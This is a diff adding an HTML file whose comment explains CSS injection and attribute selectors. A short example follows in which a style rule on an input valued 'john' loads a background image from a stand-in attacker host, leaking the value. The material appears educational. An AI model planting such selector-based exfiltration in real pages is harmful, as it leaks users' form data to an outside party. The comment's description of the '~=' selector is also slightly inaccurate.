@@ -1,0 +1,21 @@
+<!-- CSS (Cascading Stylesheet language) is the specification for webpage styling supported by web browsers. The elements of a website can be styled using the properties set by an external stylesheet. At runtime, the page can introspect itself to see the styles applied.
+
+CSS has grown over time and became gradually complex. CSS injection happens when an attacker is able to place his own CSS code into a vulnerable website.  This kind of vulnerability happens when the application permits the user-generated CSS or it is possible to interfere with the stylesheets in some way.
+
+The main impacts of CSS Injection: Cross-Site Scripting in specific conditions, UI modifications, and data exfiltration by taking out sensitive data.
+
+CSS language provides different value selectors as shown below for selecting the elements based on the value of an attribute.
+
+[attribute =value]: [username=abc]   - Selects all elements with username="abc"
+[attribute ^=value]:[username ^=abc] - Select all elements with username attribute value starting with "abc"
+[attribute $=value]:[username $=abc] - Select all elements with username attribute value ending with "abc"
+[attribute ~=value]:[username ~=abc] - Select all elements with username attribute containing the value "abc"
+Consider the below code snippet to understand how attackers can misuse these selectors. -->
+
+<style>
+    #username[value="john"] {
+            background:url("https://attacker.host/john");
+            
+    }
+</style>
+<input id="username" value="john" />
